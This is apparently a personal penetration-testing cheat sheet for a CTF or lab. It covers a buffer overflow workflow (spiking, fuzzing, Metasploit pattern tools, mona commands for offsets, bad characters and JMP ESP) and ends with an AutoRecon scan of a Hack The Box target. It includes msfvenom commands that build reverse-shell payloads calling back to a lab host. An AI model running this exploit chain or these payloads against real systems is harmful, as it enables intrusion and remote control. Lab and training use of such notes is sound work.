# Buffer Overflow
  
  - Spike
    - `generic_send_tcp 192.168.174.1 31337 ~/Code/buffer-overflow/stats.spk 0 0`
  - Fuzz
    - `~/Code/buffer-overflow/fuzzer.py`
  - Generate unique pattern:
    - `/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <bufferlen>`
  - Finding the offset
    - `~/Code/buffer-overflow/offset.py`
    - (1) `/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <bufferlen> -q <EIP address>`
    - (1) `!mona findmsp`
  - Confirm offset
    - `~/Code/buffer-overflow/overwrite_eip.py`
  - Find badchars
    - `~/Code/buffer-overflow/badchars.py`
  - Find Jump
    - `!mona modules`
    - `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb > JMP ESP`
    - (1) `!mona find -s "\xff\xe4" -m <unprotected module>`
    - (1) `!mona jmp -r ESP -m <unprotected module> / !mona jmp -r esp -cpb "<badchars>"`
  - Exploit buffer overflow
    - (1) `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.174.128 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"`
    - (1) `msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.174.128 LPORT=4444 -f c -b "\x00,\x20"`
    - `~/Code/buffer-overflow/exploit_buffer_overflow.py`

# Recon

  - `python3 ~/Repositories/AutoRecon/autorecon.py 10.10.10.74 --single-target -o /root/Recon/HTB/Chatterbox/`
  
